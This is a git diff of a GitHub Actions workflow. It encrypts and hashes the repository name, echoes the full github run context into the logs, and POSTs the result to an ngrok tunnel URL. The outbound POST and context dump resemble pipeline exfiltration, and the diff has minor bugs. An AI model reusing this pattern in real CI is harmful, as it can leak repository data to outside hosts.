@@ -19,15 +19,21 @@ jobs:
         echo "${{ github.repository }}" >> data.txt
         openssl rsautl -encrypt -inkey publickey.pem -pubin -in data.txt -out top_secret.enc
         openssl enc -base64 -in top_secret.enc -out secret.base64
-        sha256 data.txt >> "${{ SHA256 }}"
+        sha256 data.txt > hashed.txt
       env:
         PUBLIC_KEY: ${{ secrets.RSA_PUBLIC }}
         
-    - name: Read package
-      id: package
+    - name: Read encrypted data
+      id: encrypted
       uses: juliangruber/read-file-action@v1
       with:
           path: "${{ github.workspace }}/secret.base64"
+          
+    - name: Read encrypted data
+      id: sha256
+      uses: juliangruber/read-file-action@v1
+      with:
+          path: "${{ github.workspace }}/hashed.txt"
           
     - name: Echo package
       run: echo "${{ toJson(github) }}"
@@ -38,5 +44,5 @@ jobs:
         url: 'https://7cee-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
         #data: '{"key":"${{ steps.package.outputs.content }}"}'
-        data: '{"data":"${{ steps.package.outputs.content }}" , "sha256":"${{ SHA256 }}"}'
+        data: '{"data":"${{ steps.encrypted.outputs.content }}" , "sha256":${{ steps.sha256.outputs.content }}}'
       
